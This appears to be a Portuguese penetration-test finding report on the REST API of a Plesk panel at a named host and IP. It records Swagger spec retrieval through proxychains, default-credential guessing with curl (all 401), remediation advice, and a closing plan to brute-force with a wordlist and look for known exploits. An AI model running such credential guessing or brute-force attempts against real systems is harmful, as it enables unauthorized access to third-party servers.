# F-030 Plesk Obsidian 18.0.78 — API REST Discovery + Auth Test
**Alvo:** elite-iptv.com:8443 (186.194.52.218)
**Severidade:** Média
**Timestamp:** 2026-09-03T16:25:00Z
**Status:** CONFIRMADO — Swagger spec obtido, API auth não quebrada

## Swagger Specification

### Obtenção
```bash
$ proxychains4 curl -sk "https://elite-iptv.com:8443/api/v2/swagger.json" -o /tmp/swagger_spec.json
Size: 93327 bytes
```

### API Info
```json
{
  "swagger": "2.0",
  "info": {
    "version": "v2",
    "title": "Plesk RESTful API"
  },
  "basePath": "/api/v2",
  "securityDefinitions": {
    "BasicAuth": {"type": "basic"},
    "APIKeyHeader": {"type": "apiKey", "in": "header", "name": "X-API-Key"}
  }
}
```

### Endpoints Detectados (32 total)

| Método | Path | Descrição |
|--------|------|-----------|
| POST | /auth/keys | Generate API secret key |
| DELETE | /auth/keys/{key} | Delete API secret key |
| GET | /cli/commands | List CLI commands |
| POST | /cli/{id}/call | Execute CLI command |
| GET | /server | Get server information |
| POST | /server/license | Install license key |
| GET | /server/ips | List server IPs |
| GET | /extensions | List installed extensions |
| POST | /extensions | Install extension |
| GET | /clients | List clients |
| POST | /clients | Create client account |
| GET/PUT/DELETE | /clients/{id} | Client CRUD |
| GET/POST | /domains | List/Create domains |
| GET/PUT/DELETE | /domains/{id} | Domain CRUD |
| GET/POST/PUT/DELETE | /ftpusers | FTP users CRUD |
| GET/POST | /databases | List/Create databases |
| GET/POST | /dbusers | Database users |
| GET/POST/PUT/DELETE | /dns/records | DNS records CRUD |

## Teste de Autenticação

### Credenciais Default testadas (via POST para /auth/keys)
```bash
# Teste com JSON correto do swagger
curl -X POST "https://elite-iptv.com:8443/api/v2/auth/keys" \
  -H "Content-Type: application/json" \
  -d '{"login":"admin","password":"setup","ip":[]}'
```
**Resultado: Todas HTTP 401**

| Usuário | Senha | Método | Resultado |
|---------|-------|--------|-----------|
| admin | setup | POST JSON | 401 |
| admin | changeme | POST JSON | 401 |
| admin | plesk | POST JSON | 401 |
| admin | admin | POST JSON | 401 |
| admin | test | POST JSON | 401 |
| admin | password | POST JSON | 401 |
| admin | Plesk2024 | POST JSON | 401 |
| admin | (empty) | POST JSON | 401 |

### Endpoints sem Auth
| Endpoint | HTTP Status | Tem resposta? |
|----------|-------------|---------------|
| /api/v2/server | 401 | Body vazio |
| /api/v2/clients | 401 | Body vazio |
| /api/v2/domains | 401 | Body vazio |
| /api/v2/subscriptions | 404 | Page Not Found |
| /api/v2/auth/keys (GET) | 405 | Method Not Allowed |

## Interpretação

A REST API do Plesk Obsidian 18.0.78 está:
- **Totalmente documentada** via Swagger (info pública: 32 endpoints)
- **Autenticação funcional** — nenhuma credencial default funcionou
- **Nenhum endpoint público** sem auth descoberto
- API Key Header (X-API-Key) também testado sem sucesso

O acesso ao Swagger spec (HTTP 200) por si só é um vazamento de informação sobre a superfície de ataque.

## Impacto

**Severidade: Média**
- Swagger spec revela superfície de ataque completa (32 endpoints)
- Lista funcionalidades: clientes, domínios, DNS, bancos de dados, FTP, extensões
- Permite planejamento de ataque direcionado
- Sem credenciais funcionais não há acesso imediato

## Recomendação

1. Restringir acesso ao Swagger spec (autenticação requerida)
2. Implementar rate limiting por IP no endpoint /auth/keys
3. Monitorar tentativas de brute-force
4. Usar chaves API em vez de Basic Auth

## Próximo passo

Tentar brute-force mais extenso com wordlist de senhas Plesk comuns. Verificar exploit conhecidos do Plesk Obsidian 18.0.78.